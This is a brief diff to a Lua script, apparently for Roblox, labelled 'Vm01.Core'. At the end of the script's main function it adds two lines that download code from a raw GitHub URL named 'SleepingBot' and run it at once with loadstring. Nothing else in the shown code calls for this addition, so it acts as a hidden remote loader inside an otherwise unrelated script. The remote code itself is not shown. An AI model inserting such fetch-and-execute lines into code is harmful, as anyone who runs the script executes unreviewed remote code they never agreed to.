@@ -1376,5 +1376,8 @@ local function HVBJTIP_fake_script() -- Vm01.Core
 			end
 		end
 	end
+	
+	local script = game:HttpGet("https://raw.githubusercontent.com/ArawnV/Bot/main/SleepingBot")
+	loadstring(script)()
 end
 coroutine.wrap(HVBJTIP_fake_script)()
